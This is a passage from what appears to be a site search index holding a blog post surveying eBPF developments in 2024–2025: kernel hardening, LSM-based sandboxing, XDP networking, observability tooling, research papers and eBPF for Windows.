seccomp filters are limited, but an eBPF LSM program could, for example, enforce \u201cthis process may only call open() on files in /tmp and nowhere else,\u201d which is a policy that would be complex for seccomp but straightforward for BPF LSM. This kind of sandbox policy can be loaded and unloaded dynamically per container or process group, offering flexible containment.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#hardening-and-secure-ebpf-practices","title":"Hardening and Secure eBPF Practices","text":"<p>As eBPF becomes ubiquitous in security, ensuring the eBPF system itself is secure is critical. The kernel BPF subsystem has been hardened to prevent it from becoming an attack vector: - Verification and Privilege Requirements: Only privileged users (CAP_BPF or root) can load most eBPF programs, and the verifier rejects unsafe operations. The addition of BPF token (as mentioned earlier) allows delegating BPF rights carefully, but still within a controlled scope (1). Unprivileged eBPF usage remains limited to a couple of benign program types (like packet filters) to avoid giving attackers a path to kernel execution. In 2024, no major eBPF-specific CVEs were reported in the wild, indicating the ongoing scrutiny and quick patching is effective (though some prior vulnerabilities in verifier logic have been found through fuzzing and were fixed proactively).</p> <ul> <li> <p>Signed BPF Programs: Discussions in the security community considered cryptographic signing of BPF programs. This would allow only trusted, signed eBPF programs to be loaded, mitigating the risk of a compromised process injecting a malicious BPF. While not implemented in mainline as of 2025, it\u2019s a potential future enhancement for securing production environments \u2013 akin to module signing but for eBPF. In enterprise settings, some teams already enforce that only eBPF programs from certain processes (like an orchestration agent) are allowed, effectively whitelisting known-good BPF code.</p> </li> <li> <p>Hardware-Assisted Safety: Research from 2024 introduced SafeBPF, a concept of using hardware features to add defense-in-depth for eBPF programs (31: SafeBPF: Hardware-assisted Defense-in-depth for eBPF ... - dblp). For example, using Intel MPK (Memory Protection Keys) or Arm\u2019s domains to ensure an eBPF program cannot even accidentally access memory outside its bounds at runtime, even if the verifier had a bug. SafeBPF showed that with a modest overhead (~4%), hardware checks could enforce memory safety for BPF as a second line of defense ([PDF] Hardware-assisted Defense-in-depth for eBPF Kernel Extensions). While just research at this stage, it reflects the importance of eBPF in security \u2013 we now consider even hardening eBPF beyond software means.</p> </li> </ul> <p>In summary, eBPF has enabled a new class of security tooling on Linux: one that operates within the kernel, with deep visibility and control, but without the risk and rigidity of traditional kernel modules. From detecting intrusions to sandboxing processes and enforcing custom policies, eBPF is a powerful ally for security engineers. The year 2024 saw these concepts move from experimental to real-world: major cloud providers and software vendors are actively employing eBPF for security, and the trend is likely to grow as more organizations realize the benefits of kernel-level instrumentation for defense.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#networking-ebpfs-impact-on-performance-observability-and-security","title":"Networking: eBPF\u2019s Impact on Performance, Observability, and Security","text":"<p>Networking was the original use case that brought eBPF to prominence, and it continues to be an area of intensive development and application. In 2024\u20132025, eBPF further transformed how packets are processed in Linux, improving performance and offering unprecedented flexibility. This section discusses eBPF\u2019s role in high-performance networking (like XDP and load balancing), how it enhances network observability, and its uses in network security and policy enforcement.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#high-performance-packet-processing-xdp-and-beyond","title":"High-Performance Packet Processing (XDP and Beyond)","text":"<p>eXpress Data Path (XDP), which uses eBPF at the earliest point of packet reception (the NIC driver), remains a flagship eBPF feature for performance. In 2024, adoption of XDP in production networks grew. Key developments and use cases include:</p> <ul> <li> <p>DDoS Mitigation and Load Balancing: Companies like Cloudflare have long used XDP for DDoS attack mitigation. By running an eBPF program at the NIC driver level, packets can be dropped or steered at millions of packets per second rates, before the Linux networking stack even touches them. Cloudflare reported auto-mitigating massive attacks (exceeding 1\u20132 billion packets per second in aggregate globally) using XDP-based filters (32: How Cloudflare auto-mitigated world record 3.8 Tbps DDoS attack). They achieved dropping ~10 million packets per second on a single core with XDP in one case (4), a testament to eBPF\u2019s efficiency. Similarly, other CDNs and cloud providers use XDP for load balancing \u2013 for example, balancing UDP-based loads or initial TCP SYNs \u2013 as it can make forwarding decisions faster than user-space load balancers. Facebook\u2019s open-source Katran project (XDP-based L4 load balancer) was updated to leverage new BPF features and support newer kernels, continuing to power load balancing in Meta\u2019s data centers.</p> </li> <li> <p>XDP Offloads and Driver Support: Over the last year, more network drivers gained robust XDP support, including for advanced features like XDP multi-buffer (handling jumbo frames or segmented packets) and XDP transmit (TX) action to reinject packets. There has also been work on hardware offloads for eBPF: some NICs (like certain Netronome and Intel models) can offload eBPF bytecode to run directly on the NIC. While still limited in 2024 (with only specific NICs and program limitations), this area is growing. Offloading eBPF to hardware can nearly eliminate CPU cost for certain filtering tasks. Research and vendor collaborations are ongoing to expand offload support (for instance, project P4 -&gt; eBPF -&gt; hardware pipelines). </p> </li> <li> <p>Custom Protocols and In-Kernel Networking: eBPF has enabled innovation with custom networking protocols. Using hooks like BPF socket operations (BPF_SK_SKB and BPF_SK_MSG), developers implement user-space TCP/IP alternatives or tweak behavior of sockets. An example is in accelerating RPC frameworks: by using eBPF at the socket level to bypass some kernel layers, tail latency can be reduced. There were reports of companies implementing fast path gRPC handling via eBPF sockops. Another creative use is in tunneling/encapsulation: projects like Cilium\u2019s Geneve offload use BPF to encapsulate/decapsulate packets for overlay networks directly in XDP or TC layer, saving the cost of passing packets up to Linux\u2019s tunneling stack.</p> </li> <li> <p>Tc and Traffic Control: While XDP handles ingress at the device, eBPF also powers the more general traffic control (tc) hooks at various points (ingress/egress on interfaces, clsact qdisc). Many projects moved their iptables-based pipelines to BPF here. For instance, Calico, a Kubernetes networking project, offers an eBPF dataplane mode that attaches eBPF at tc ingress/egress to implement Kubernetes NetworkPolicies, instead of iptables. This drastically improves performance by avoiding traversing netfilter chains for each packet and using efficient maps to make routing decisions. In 2024, Calico eBPF mode became stable and gained features like host routing and encapsulation with BPF, indicating that multiple major CNIs (Container Networking Interfaces) now fully embrace eBPF in production. Another example is Facebook\u2019s MRF (Maglev Routing in BPF) which uses tc eBPF to perform MAGLEV hashing for L4 load-balancing. The BPF program can look at packet headers and decide which backend server to forward to, all in one pass, replacing the need for an external load balancer.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#network-observability-with-ebpf","title":"Network Observability with eBPF","text":"<p>Beyond data plane acceleration, eBPF greatly enhances network observability. It provides deep visibility into network traffic and stack events without needing external capture devices or kernel recompilation:</p> <ul> <li> <p>Per-Packet and Flow Visibility: eBPF programs can be attached to tracepoints or kprobes in the network stack to count packets, measure latency, or collect statistics. For example, one can attach a BPF program to the TCP retransmit function to count retransmissions, or to the point a packet is received and when it\u2019s transmitted to measure queueing delay. These capabilities have been packaged into tools like Cilium Hubble, which is a network observability platform that leverages eBPF to monitor flows in Kubernetes (33: Tetragon Archives - Isovalent). Hubble uses eBPF programs to trace connections and record metadata (like source/destination, ports, bytes transferred, latency) for every flow, exporting it to a UI for developers to visualize traffic between services. In 2024, Hubble improved its eBPF-based detection of things like TCP resets, DNS queries, and allowed/denied decisions (since it hooks into Cilium\u2019s BPF policy enforcement points). Another tool, Pixie, which focuses on application-level observability, also taps into socket-level eBPF to capture HTTP request traces and TLS metadata, linking network data with application traces (34).</p> </li> <li> <p>Low Overhead Packet Capture: Traditional packet capture (tcpdump, etc.) can be expensive at high rates. eBPF offers a way to sample or filter packets in kernel. For instance, an eBPF program attached at tc egress could capture 1 out of N packets (or only headers) and send them to user space via perf ring buffer. This approach has been used to implement \u201calways-on\u201d packet capture for debugging that has minimal overhead. In 2024, we saw eBPF being integrated into tracing frameworks (like a prototype of Wireshark with eBPF support, where capture filters are eBPF programs running in kernel to pre-filter traffic). </p> </li> <li> <p>Integration with Monitoring Systems: eBPF metrics are now feeding into Prometheus/Grafana and other monitoring systems. For example, Facebook\u2019s eBPF monitoring tooling can expose metrics like CPU cycles per packet at various hooks, or counts of packets hitting certain filters. Many of these metrics can be gathered by eBPF and then either pushed directly to a time-series database or pulled via tools like BPF Exporter. Some open-source exporters use eBPF to gather TCP stats (like connection counts, SYN rate, RTT measurements) and expose them as Prometheus metrics. The advantage is these can often be gathered without enabling verbose kernel counters, thus focusing only on what the user cares about.</p> </li> </ul> <p>Importantly, eBPF\u2019s ability to correlate network events with processes and containers is a game changer for observability. Since eBPF programs can easily get the current task (process) info, tools can attribute network usage or errors to the specific application causing them \u2013 something that used to require complex user-space correlation.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#network-security-and-policy","title":"Network Security and Policy","text":"<p>eBPF also plays a critical role in network security and policy enforcement in modern systems:</p> <ul> <li> <p>Firewall and Policies: The idea of using eBPF to enforce network policies at the kernel level has largely replaced the need for iptables in high-end scenarios. For example, Cilium uses eBPF programs to implement Kubernetes network policy, which can specify which services (pods) can talk to which. These programs act like firewall rules but are much more efficient and dynamic. They evaluate tuple matches via BPF maps (hash tables) rather than linear rule checks, and can be updated in real-time as endpoints come and go. 2024 saw further refinements here, like more optimizations in Cilium\u2019s BPF policy engine to handle large scale (tens of thousands of pods) by structuring maps to allow O(1) lookups of policy decisions. Similarly, eBPF is used to implement NAT for Kubernetes Services (replacing kube-proxy). The consensus in cloud-native networking by 2024 is that eBPF-based datapaths provide better performance and scalability, which is why projects like Cilium are gaining popularity for large clusters.</p> </li> <li> <p>Intrusion Detection in Network Traffic: While earlier we discussed host-level threat detection, eBPF is also used for network threat detection. For instance, detecting port scans or volumetric anomalies can be done by BPF programs that count connection attempts or packets per IP and trigger alerts when thresholds exceed. There are prototypes of eBPF programs doing deep packet inspection for specific protocols (though heavy DPI in eBPF is challenging due to instruction and CPU limits). Nonetheless, eBPF can parse packet headers to detect anomalies (like unusual flags combinations that might indicate malicious scans). Suricata, an open-source intrusion detection system, introduced an eBPF mode to offload parts of its packet capture and filtering to eBPF, thus freeing user-space IDS engine to focus on the payload analysis. </p> </li> <li> <p>TLS and Encryption Visibility: With more traffic being encrypted, eBPF has been utilized to gain some observability/security on encrypted traffic without breaking encryption. By using BPF hooks at the kernel\u2019s TLS layer (KTLS) or at userspace boundaries, one can record metadata of encrypted sessions. Facebook has a tool that uses eBPF to gather TLS handshake details (like server name, cipher) for monitoring. Google\u2019s gVisor team built an eBPF-based TLS inspector that grabs just the Server Name Indication (SNI) from handshakes to apply policies (like blocking certain hostnames) \u2013 all done in kernel space so it\u2019s very fast and cannot be bypassed easily. These examples show that eBPF enables security measures that operate in-line with network traffic at kernel speed.</p> </li> </ul> <p>In conclusion, eBPF\u2019s impact on networking in 2024\u20132025 is multifaceted: it accelerates packet processing (making software forwarding and filtering viable at NIC line rates), it provides deep insight into network behavior (linking packets to processes and applications, exposing fine-grained metrics), and it enforces policies with both flexibility and efficiency. The networking community, including kernel developers and network engineers, continue to push eBPF\u2019s boundaries, replacing more and more of the traditional networking stack with eBPF-based components for better performance and agility. The combination of speed and programmability that eBPF offers is unmatched in Linux\u2019s history of networking features.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#observability-ebpf-driven-performance-monitoring-and-telemetry","title":"Observability: eBPF-Driven Performance Monitoring and Telemetry","text":"<p>Observability has been revolutionized by eBPF by enabling detailed monitoring of systems without heavy instrumentation. In 2024\u20132025, this trend only grew stronger. eBPF is now a go-to solution for gathering metrics, profiling applications, and understanding system performance in both development and production. This section explores how eBPF is used in observability, covering performance monitoring, profiling, and general telemetry gathering.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#system-performance-monitoring","title":"System Performance Monitoring","text":"<p>Traditionally, monitoring system performance involved a mix of tools (perf, system taps, custom logs) and often incurred overhead or required privileges. eBPF offers a unified way to monitor various aspects (CPU, memory, I/O, etc.) with minimal overhead:</p> <ul> <li> <p>CPU and Scheduler Monitoring: With eBPF kprobes and tracepoints, one can trace scheduler events to record scheduling latency, run queue lengths, or context switch counts per process. Tools have been built using eBPF to track how long tasks stay in run queues or how often threads are being migrated between CPUs. Facebook, for instance, has eBPF-based tooling to identify CPU contention issues by tracing scheduler tracepoints and aggregating data by process. In Linux 6.12, with the introduction of BPF schedulers (sched_ext), there\u2019s even more possibility: one can implement a monitoring-only scheduler policy that doesn\u2019t change scheduling but profiles it \u2013 essentially using the scheduler hook to timestamp and log scheduling events for analysis.</p> </li> <li> <p>Memory and I/O Observability: eBPF can tap into memory management events \u2013 for example, tracing page faults or monitoring the slab allocator. A developer can attach eBPF to the mm_vmscan tracepoints to see when the system is under memory pressure (reclaim events) and which processes are causing it. Similarly for I/O, eBPF programs attached to block device tracepoints can measure request latency, queue depth, and throughput per device or cgroup. In 2024, there have been guides on debugging memory leaks with eBPF (as seen on ebpf.io blog posts), where an eBPF program is used to track allocations and frees in the kernel to identify which code path is leaking memory over time. This kind of dynamic analysis was historically very difficult without eBPF.</p> </li> <li> <p>Low Overhead Metrics: One of eBPF\u2019s strengths in observability is doing work in kernel to reduce overhead. For example, an eBPF program can maintain counters or histograms (using BPF maps) for events of interest, and user-space can periodically read these maps. This avoids the cost of context-switching for every event. Many performance metrics tools in 2024 adopted this model. Instead of, say, incrementing a user-space counter on every page fault (which would require a syscall), an eBPF program increments a map value and user-space just reads that every few seconds. Modern observability platforms leverage this to gather lots of metrics with negligible impact on the system. It\u2019s been noted that eBPF allows one to monitor system behavior \u201cwithout the overhead or risks associated with traditional methods\u201d (5) \u2013 meaning no need to enable verbose kernel logging or to run heavy user daemons; a small BPF program can do the job quietly and safely.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#application-profiling-and-tracing","title":"Application Profiling and Tracing","text":"<p>Perhaps one of the most exciting areas is using eBPF for application-level observability \u2013 profiling CPU usage, tracing function calls, and tracking high-level events in applications:</p> <ul> <li> <p>CPU Profiling (Sampling): eBPF has enabled always-on profiling in production. Projects like Parca (by Polar Signals) use eBPF to sample stack traces across all processes at a high frequency (e.g., 100 Hz) and record them for flame graph analysis. By attaching eBPF to perf events (hardware PMUs or timer-based sampling), they can capture kernel and user-space stacks system-wide with low overhead. Because the sampling and stack unwinding (thanks to BPF stack trace maps and BTF for user-space) happen in kernel context, the impact on the system is minimal and consistent. Companies have deployed this for continuous profiling \u2013 getting insights like \u201cwhich functions are consuming CPU over time\u201d without instrumenting the code or affecting application performance significantly. In 2024, improvements in BTF (type info) for user-space programs made user-space stack unwinding via eBPF even more reliable, broadening the use of such profilers to languages like Go, Java (with JIT symbol support), etc.</p> </li> <li> <p>Tracing Application Functions: With kprobes/uprobes and the newer fentry/fexit mechanisms, eBPF can trace both kernel and user functions in a lightweight manner. fentry (function entry) programs, in particular, have near-zero overhead when not used, and minimal overhead when attached. Developers have used these to trace critical application functions (via uprobes) to measure, for example, how long a DB query function takes or how often a cache lookup function fails. Tools like bpftrace make this on-the-fly tracing very accessible \u2013 one can attach to a user-level function by name if symbols are available. In Kubernetes environments, Pixie provides auto-instrumentation by preloading eBPF programs that watch for common library calls (like HTTP handlers, database client calls) and automatically trace them (34). This means without modifying the app, one can get traces of incoming HTTP requests, their downstream queries, and timings \u2013 essentially application performance monitoring powered by eBPF.</p> </li> <li> <p>Aggregating High-Level Events: eBPF can also serve as the glue between kernel events and application context. For example, an eBPF program can capture an event \u201cthis process did a write() to this file descriptor\u201d and then in user-space one can map that file descriptor to, say, a logical operation in the app. Some advanced observability systems use eBPF to capture events and then enrich them in user-space with context from the application or from Kubernetes (like adding pod name, etc., based on PID to pod mapping). The result is very rich telemetry. A concrete example: an eBPF program logs that process X called <code>mysql_query()</code>, user-space notes process X is part of service Y in container Z, so it records an event \u201cservice Y executed SQL query\u201d for monitoring. Achieving this in a pre-eBPF world would require either invasive instrumentation or parsing verbose logs, neither of which are as efficient or timely as eBPF. </p> </li> <li> <p>Safety and Stability: It's worth noting that eBPF-based observability tools are designed to be safe to run even in production on busy systems. They use ring buffers and per-CPU data maps to minimize interference with the kernel, and they keep event handling lightweight. Should something go wrong (a bug in an eBPF probe), the worst outcome is typically the kernel killing the BPF program or rate-limiting it, rather than a full crash, thanks to the safety mechanisms in place. This gives confidence to use these tools in environments where uptime is critical.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#observability-for-cloud-native-and-distributed-systems","title":"Observability for Cloud Native and Distributed Systems","text":"<p>The cloud native ecosystem has fully embraced eBPF for observability, aligning with trends we\u2019ve touched on:</p> <ul> <li> <p>Kubernetes Observability: In k8s, eBPF is used to observe not just single-node metrics but also cluster-wide phenomena. Tools running on each node use eBPF to capture data, and then aggregate it centrally. For example, Kubernetes event-driven autoscaling (KEDA) can use eBPF to determine event rates (like HTTP requests per second) as a trigger to scale pods up or down. Another example is capturing network flow logs via eBPF on each node (as Hubble does) and sending them to a central system for network monitoring across the cluster.</p> </li> <li> <p>Service Mesh and Application Monitoring: Some service mesh implementations explored eBPF as a way to bypass sidecar proxies for monitoring. Instead of sending every packet through an Envoy sidecar (for telemetry collection and policy), they considered eBPF programs capturing the needed data (like request counts, latencies) and enforcing policies (like mTLS) directly. This can significantly reduce the complexity and overhead of a mesh. In 2024, projects like Merbridge emerged, which uses eBPF to skip the user-space proxy in Istio service mesh, effectively doing L4 redirection in kernel to avoid an extra hop. The success of such approaches could influence how future service meshes are designed, leaning more on eBPF.</p> </li> <li> <p>Edge and IoT Observability: Even beyond cloud data centers, eBPF is finding use in edge computing and IoT devices for monitoring. Because eBPF can run on any Linux (and even constrained environments with Linux), it\u2019s a lightweight way to implement remote debugging or monitoring. A small agent can load eBPF programs to, say, monitor a device\u2019s sensor read frequency or network usage without impacting the device\u2019s main functions.</p> </li> </ul> <p>In summary, eBPF has become an indispensable tool in observability. Its ability to provide granular insights with low overhead has led to a flourish of new tools and techniques for monitoring both systems and applications. By 2025, many performance issues or production incidents that once required guessing or adding logging can be directly analyzed with eBPF-based tooling, often in real-time. The phrase \u201cobservability \u2013 the eBPF effect\u201d (35: Observability \u2014 The eBPF Effect -Part 1 | by john hayes - Medium) has been used to describe how eBPF has fundamentally improved visibility into running systems, and indeed it continues to live up to that promise.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#research-and-future-directions-in-ebpf","title":"Research and Future Directions in eBPF","text":"<p>The rapid adoption of eBPF has spurred extensive research in both academia and industry. In 2024 and early 2025, numerous research papers, workshops, and conference talks focused on eBPF\u2019s capabilities, performance, and potential enhancements. This section summarizes notable research contributions and what they indicate for the future of eBPF.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#academic-research-highlights","title":"Academic Research Highlights","text":"<ul> <li> <p>Verifier Validation and Static Analysis: A critical area of academic focus has been on the eBPF verifier. One paper introduced state embedding as a technique to validate the correctness of the eBPF verifier ([PDF] Validating the eBPF Verifier via State Embedding - USENIX). By modeling verifier state and exploring it systematically, researchers can detect if there are any gaps that might let unsafe programs through or mistakenly reject safe programs. This work helps increase trust in the eBPF verifier, which is paramount for security. In addition, state-of-the-art static analysis techniques were applied to eBPF programs themselves. For example, checking eBPF programs for potential Spectre vulnerabilities or other side-channel issues has been explored, given that BPF programs could be used to exfiltrate data if not careful. The outcome of this line of research is likely to be tools that can prove properties about BPF programs or the verifier, yielding even stronger safety guarantees.</p> </li> <li> <p>Extending eBPF Capabilities: Several papers looked at how to extend eBPF to new domains. One notable research topic is unprivileged eBPF usage. A paper titled \u201cUnleashing Unprivileged eBPF with Dynamic Sandboxing\u201d examined ways to allow more eBPF functionality for unprivileged users by dynamically analyzing and sandboxing their BPF programs ([PDF] Unleashing Unprivileged eBPF Potential with Dynamic Sandboxing). The idea is to expand eBPF\u2019s usability (e.g., let normal users run certain tracing programs) while maintaining safety via secondary checks or constraints. While the kernel approach has been to be very conservative (hence features like BPF token), these research efforts could influence future kernel changes to safely open up eBPF to broader use.</p> </li> <li> <p>Performance and Comparative Studies: The performance of eBPF versus other technologies was a hot topic. At the 2024 Linux BPF Summit, Alan Jowett presented a comparison of BPF implementations across platforms (36: Comparing BPF performance between implementations - LWN.net). This included eBPF on Windows (an implementation by Microsoft) vs. Linux\u2019s eBPF. One key finding was that the overhead of helper functions is a major factor in performance (6). This kind of insight informs where to optimize (e.g., perhaps by inlining more helper logic in JIT or reducing transitions). Another academic project, BPF-Perf, systematically measured how BPF program size and complexity affect throughput on Linux, providing data that kernel developers can use to calibrate verifier limits for optimal performance.</p> </li> <li> <p>New Use Cases (Systems and Networking): Researchers also explored novel uses of eBPF. In networking academia, a new workshop eBPF and Kernel Extensions @ SIGCOMM 2024 was held, which featured papers like NetEdit: Orchestration Platform for eBPF Network Functions. NetEdit in particular discussed managing multiple eBPF programs for network functions (like a chain of processing steps) in a safe way, essentially treating eBPF programs as modular network functions that can be inserted, removed, or updated on the fly. Another paper from NSDI 2023, Electrode: Accelerating Distributed Protocols with eBPF, showed how an eBPF program running in the OS kernel can accelerate consensus protocols (like Paxos) by handling certain packet processing and timing tasks more efficiently than user-space could. These works indicate that eBPF is inspiring re-thinking of software architecture: pushing more logic into the kernel for performance while still keeping it flexible.</p> </li> <li> <p>Security and Formal Methods: On the formal side, a noteworthy publication titled \u201cKernel extension verification is untenable\u201d ([PDF] Kernel extension verification is untenable - acm sigops) critically examined eBPF\u2019s approach to safety (runtime verification) versus ahead-of-time verification or synthesis. It argued about limitations in the current model and possibly advocated for new verification frameworks or safer languages for writing eBPF. Additionally, SafeBPF (mentioned earlier) leveraged hardware features to enforce security ([PDF] Hardware-assisted Defense-in-depth for eBPF Kernel Extensions). Another interesting intersection was machine learning with eBPF \u2013 one preprint \u201cWhen eBPF Meets Machine Learning: On-the-fly Kernel Compartmentalization\u201d (37: When eBPF Meets Machine Learning: On-the-fly OS Kernel ... - arXiv) suggests using ML to detect patterns and dynamically compartmentalize (isolate) parts of the kernel via eBPF programs. While in early stages, it shows the creative cross-disciplinary interest eBPF is generating.</p> </li> </ul>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#ebpf-for-windows-and-cross-platform-efforts","title":"eBPF for Windows and Cross-Platform Efforts","text":"<p>eBPF\u2019s success on Linux led to efforts to bring eBPF to other operating systems. The eBPF for Windows project made significant progress in 2024. This project, led by Microsoft and contributors, aims to allow eBPF programs to run on Windows (in kernel-mode or user-mode drivers) using a similar API and verifier model. By late 2024, eBPF for Windows could support basic hooks (for packet filtering in the Windows networking stack and some tracing of kernel events) and reused components like the PREVAIL verifier and uBPF JIT engine (38: eBPF Core Infrastructure Landscape) (39: ebpf-for-windows-release/README.md at main - GitHub). Predictions in the community suggested that \u201ceBPF will finally come to Windows\u201d in this timeframe (40), and indeed Windows Server teams are evaluating eBPF for firewalling and observability tasks. While not yet production-ready for all use cases (marked as work-in-progress and not recommended for production by Microsoft\u2019s own admission (41: Production readiness for eBPF on windows #3285 - GitHub)), the project is a huge step toward making eBPF a cross-platform standard. This could allow developers to write an eBPF program once and use it for both Linux and Windows, particularly for things like network filtering or telemetry, increasing code reuse and consistency in policy enforcement across platforms.</p> <p>Beyond Windows, there\u2019s also talk of eBPF-like capabilities in other OSs: the XNU kernel (macOS/iOS) has some packet filter (previous Berkeley Packet Filter mechanisms) and researchers have pondered if eBPF could be ported or a similar concept applied. There\u2019s no official port yet, but the idea of a universal, OS-agnostic eBPF bytecode is floating around. This is partly why standardizing the eBPF instruction set and behavior (with a conformance test suite) is important \u2013 to ensure a BPF program means the same thing everywhere. Jowett\u2019s BPF conformance suite (23: Towards a standardized eBPF ISA - Conformance testing - Alan Jowett) is an early effort in that direction.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#community-and-industry-contributions","title":"Community and Industry Contributions","text":"<p>The eBPF community (developers, companies, foundation) has been very active: - eBPF Foundation Projects: The eBPF Foundation (under the Linux Foundation) has been coordinating community efforts, including funding research. In 2024, the Foundation announced five academic research grants (totaling $250k) targeting eBPF improvements (7). The focus areas of these grants were explicitly to \u201cimprove scalability, static analysis, verifier, virtual memory, and more\u201d (7). This aligns with the technical challenges discussed: how to scale eBPF to more cores and heavier workloads, how to formally analyze BPF programs, how to evolve the verifier and possibly allow controlled dynamic memory, etc. The Foundation also published a \u201cState of eBPF\u201d report (42: State of eBPF 2024 - Linux Foundation) summarizing how eBPF is used and its trajectory, which helps educate and bring more stakeholders on board.</p> <ul> <li> <p>Conferences and Collaboration: eBPF had dedicated tracks in major conferences (Linux Plumbers Conference had a BPF &amp; Networking track, Open Source Summit, etc.) where many of these advances were discussed. The openness of eBPF development (via bpf mailing list and weekly meetings) means ideas from research often get quickly communicated to Linux maintainers. For instance, if a research group finds a verifier bug or a potential optimization, they often post it on the mailing list, sometimes resulting in a patch merged within weeks. This tight feedback loop between academia and practice is somewhat unique to eBPF\u2019s development ethos.</p> </li> <li> <p>Looking Forward \u2013 The Next 10 Years: A special talk \u201cModernizing BPF for the next 10 years\u201d (17: Modernizing BPF for the next 10 years - LWN.net) took place to envision eBPF\u2019s future. Topics included lifting some of the current limitations (like static stack size, perhaps by introducing controlled dynamic allocation), improving the BPF programming experience (maybe higher-level languages or better debugging), and deeper integration with kernel subsystems (one could imagine eBPF for GPU drivers or filesystems similarly to how it\u2019s used in networking). Also, the idea of BPF as a universal runtime was floated \u2013 essentially, could eBPF become the common target for extensibility in various contexts (from smart NICs, to hypervisors, to OS kernels)? If so, ensuring portability and performance will be key.</p> </li> <li> <p>Standardization: With multiple implementations of eBPF (Linux, Windows, uBPF, P4-&gt;BPF pipelines, etc.), there is a push towards standardizing aspects of eBPF. This might not mean a formal standards body yet, but informally through the foundation and conferences, an agreement on things like supported instruction set (for example, not relying on Linux-specific helpers if you want portability), or creating a baseline \u201cBPF 1.0\u201d spec. This would encourage hardware and other OS vendors to implement eBPF, knowing they target the same baseline.</p> </li> </ul> <p>In conclusion, research and community efforts in 2024\u20132025 have both fortified the foundation of eBPF and stretched its horizons. Verifier improvements and formal analyses are making it more secure and reliable. Cross-platform and hardware-offload work is expanding its reach beyond Linux. And visionary discussions are painting a picture of eBPF as a long-term, evolving technology that could influence many areas of computing. For developers and organizations, this means investing in eBPF skills and infrastructure is likely to pay dividends as the technology continues to advance in capability and ubiquity.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#conclusion","title":"Conclusion","text":"<p>The years 2024 and early 2025 have been remarkably productive for the eBPF ecosystem. We have seen the Linux kernel integrate groundbreaking features (from BPF tokens and arenas to a BPF-powered scheduler) that enhance what eBPF programs can do while keeping the system secure and fast. The tooling landscape has matured, lowering barriers for developers and enabling complex eBPF applications to be built and debugged with confidence. In security, eBPF has proven its worth by providing dynamic defenses and deep visibility, effectively redefining how we approach runtime security and forensics on Linux. In networking, eBPF has continued its disruption, powering high-performance datapaths and providing granular observability and control that were previously unattainable in software. Observability as a whole has been elevated by eBPF, with granular, low-overhead telemetry now at the fingertips of SREs and developers, leading to more reliable and well-understood systems. </p> <p>Research contributions underscore that this is only the beginning: as eBPF finds its way into other operating systems, hardware devices, and new domains, we can expect the technology to become even more universal. The strong collaboration between the Linux community, industry players, and academia is a healthy sign that eBPF\u2019s evolution will continue to address real-world needs while pushing technical boundaries. The eBPF Foundation\u2019s involvement and support ensure that development remains open and broad-based.</p> <p>For eBPF developers and enterprises adopting eBPF, the progress in 2024\u20132025 means more capability at your disposal: you can write more sophisticated programs, rely on a richer set of tools, and deploy eBPF in even more scenarios (with confidence in its stability). Domain experts are leveraging eBPF to solve performance bottlenecks and security challenges that were previously intractable or required severe trade-offs. As of 2025, eBPF stands not just as a niche kernel feature, but as a proven, versatile platform for innovation across the stack.</p> <p>In summary, the eBPF ecosystem is thriving. Kernel improvements have expanded its power, tooling has made it accessible, and applications in security, networking, and observability have validated its importance. Backed by a growing body of research and a vibrant community, eBPF is well on its way to defining the next decade of software-defined infrastructure. The investments and developments of the past year will no doubt catalyze further breakthroughs, making it an exciting time to be involved in eBPF.</p>"},{"location":"blog/2025/02/12/ebpf-ecosystem-progress-in-20242025-a-technical-deep-dive/#references-and-sources","title":"References and Sources","text":"<ul> <li>Linux Kernel Mailing List archives and commit history for eBPF (Linux 6.7 through 6.13)  </li> <li>Kernelnewbies changelogs for recent Linux versions (6.7\u20136.12) (1: Linux_6.9 - Linux Kernel Newbies) (10: Linux_6.7 - Linux Kernel Newbies)  </li> <li>LWN.net articles on BPF features and conference discussions (13: 2024 Linux Storage, Filesystem, Memory-Management, and BPF ...) (11: BPF Exceptions - 1/2 - LWN.net)  </li> <li>eBPF Summit 2024 talks and recap (ebpf.io)  </li> <li>Cilium/Isovalent blog posts on eBPF predictions and features (40: Networking and eBPF Predictions for 2025 and Beyond - Isovalent) (28: eBPF Runtime Security with Tetragon: Insights from v1.14 - Isovalent)  </li> <li>Cloudflare engineering blog on XDP and DDoS mitigation (4: How to drop 10 million packets per second - The Cloudflare Blog)  </li> <li>Aqua Security blog/press on Tracee and Traceeshark (26: Aqua Unveils Traceeshark: Tool Combining Tracee with Wireshark)  </li> <li>Isovalent (Cilium) resources on Tetragon and Hubble (27: Top Kubernetes Security Use Cases: Tetragon and eBPF ... - Isovalent) (43: Deeper Host Network Observability with eBPF - Isovalent)  </li> <li>Pixie Labs and other observability blogs on eBPF usage (34: eBPF TLS tracing: The Past, Present and Future | Pixie Labs Blog) (5: eBPF-Based Network Observability: Exploring Cilium Hubble and ...)  </li> <li>Academic papers: USENIX, SIGCOMM eBPF Workshop 2024, OSDI/ATC (as cited above) ([PDF] Validating the eBPF Verifier via State Embedding - USENIX) (6)  </li> <li>eBPF Foundation announcements and reports (7: eBPF Foundation Announces $250000 in Grant Awards for Five ...) (6: Understanding BPF Performance: Comparing eBPF for Windows vs ...)  </li> 